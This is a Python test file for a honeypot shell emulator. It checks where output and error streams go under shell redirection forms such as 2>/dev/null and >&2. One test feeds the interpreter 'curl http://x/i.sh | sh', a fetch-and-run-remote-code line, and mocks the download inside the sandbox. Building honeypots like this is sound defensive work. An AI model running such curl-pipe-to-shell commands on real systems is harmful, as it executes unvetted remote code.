"""Tests for fd-qualified redirection semantics (2>, 2>&1, >&2, &>, 2>/dev/null).

The parser now accepts these (see test_parser.py); here we assert the runtime
*behaviour*: where each stream actually ends up. This was the highest-priority
deferred item across all HANDOFFs — attacker scripts lean on ``2>/dev/null`` and
``>&2`` constantly.

Runnable two ways:
    python -m pytest tests/test_fd_redirect.py
    python tests/test_fd_redirect.py
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from honeyshell.commands import ShellContext, StringWriter, discover  # noqa: E402
from honeyshell.shell.interpreter import Interpreter  # noqa: E402
from honeyshell.fs.build_sample_fs import build as build_sample_fs  # noqa: E402

discover()


def _run(line, cwd="/tmp"):
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd=cwd,
                       username="root")
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    code = asyncio.run(interp.execute(line))
    return code, out.getvalue(), err.getvalue(), ctx


def test_stdout_to_stderr():
    _, out, err, _ = _run("echo error >&2")
    assert out == ""            # nothing on stdout
    assert err == "error\n"     # went to stderr


def test_stderr_discarded_to_devnull():
    _, out, err, _ = _run("cat /nonexistent 2>/dev/null")
    assert err == ""            # error suppressed
    assert out == ""


def test_stderr_merged_into_stdout():
    _, out, err, _ = _run("cat /nonexistent 2>&1")
    assert "No such file" in out   # error appears on stdout
    assert err == ""               # not on stderr


def test_stderr_to_file():
    _, out, err, ctx = _run("cat /nonexistent 2>/tmp/errlog")
    assert ctx.fs.exists("/tmp/errlog")
    assert "No such file" in ctx.fs.readtext("/tmp/errlog")
    assert err == ""


def test_both_streams_to_file():
    _, out, err, ctx = _run("cat /nope &>/tmp/both")
    assert ctx.fs.exists("/tmp/both")
    assert "No such file" in ctx.fs.readtext("/tmp/both")


def test_plain_stdout_redirect_unaffected():
    _, out, err, ctx = _run("echo hello > /tmp/out")
    assert ctx.fs.readtext("/tmp/out") == "hello\n"
    assert out == ""


def test_stderr_append_to_file():
    ctx_line = "cat /nope 2>/tmp/log"
    _, _, _, ctx = _run(ctx_line)
    # second append
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    asyncio.run(interp.execute("cat /nope2 2>>/tmp/log"))
    content = ctx.fs.readtext("/tmp/log")
    assert content.count("No such file") == 2   # both errors accumulated


def test_no_syntax_error_on_installer_style_line():
    # The reported failure: a script line using >& must not raise a syntax
    # error through the sh path.
    async def fetch(url):
        return b'echo "checking..." >&2\necho done\n'
    ctx = ShellContext(fs=build_sample_fs(hostname="svr04"), cwd="/root",
                       username="root")
    ctx.fetch_content = fetch
    out, err = StringWriter(), StringWriter()
    interp = Interpreter(ctx, stdout=out, stderr=err)
    asyncio.run(interp.execute("curl http://x/i.sh | sh"))
    assert "syntax error" not in err.getvalue()
    assert "done" in out.getvalue()


def _run_standalone() -> int:
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failed = 0
    for fn in fns:
        try:
            fn()
            print(f"ok   {fn.__name__}")
        except AssertionError as e:
            failed += 1
            print(f"FAIL {fn.__name__}: {e}")
    print(f"\n{len(fns) - failed}/{len(fns)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(_run_standalone())
